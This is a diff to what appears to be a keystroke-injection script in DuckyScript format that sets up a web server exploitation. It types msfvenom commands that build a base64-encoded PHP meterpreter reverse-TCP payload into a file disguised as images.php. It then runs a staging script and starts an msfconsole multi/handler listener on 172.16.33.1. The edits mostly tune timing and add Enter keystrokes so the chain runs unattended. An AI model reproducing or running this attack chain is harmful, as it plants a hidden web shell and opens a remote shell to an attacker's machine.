@@ -5,6 +5,10 @@ STRING gnome-terminal
 DELAY 400
 ENTER
 DELAY 400
+STRING /usr/bin/wmctrl -r :ACTIVE: -b add,fullscreen
+DELAY 400
+ENTER
+DELAY 400
 STRING #[INFO] Hello, let's setup the webserver exploitation :)
 DELAY 400
 ENTER
@@ -17,8 +21,9 @@ STRING /bin/echo '<?PHP' > images.php
 ENTER
 DELAY 400
 STRING /usr/bin/msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.33.1 -e php/base64 -f raw  >> images.php
-DELAY 5000
+DELAY 400
 ENTER
+DELAY 5000
 STRING /bin/echo '?>' >> images.php
 DELAY 400
 ENTER
@@ -32,18 +37,28 @@ DELAY 400
 ENTER
 STRING #[INFO] OK you asked for it ... here goes
 ENTER
-DELAY 400
+DELAY 1000
 STRING ./stage_webshell.sh
+DELAY 400
 ENTER
-DELAY 2000
+DELAY 5000
 STRING /usr/bin/msfconsole
+DELAY 400
+ENTER
 DELAY 15000
 STRING use multi/handler
-ENTER
 DELAY 400
+ENTER
+DELAY 2000
 STRING set PAYLOAD php/meterpreter/reverse_tcp
 DELAY 400
+ENTER
+DELAY 1000
 STRING set LHOST 172.16.33.1
 DELAY 400
+ENTER
+DELAY 1000
 STRING exploit
+DELAY 400
+ENTER
 
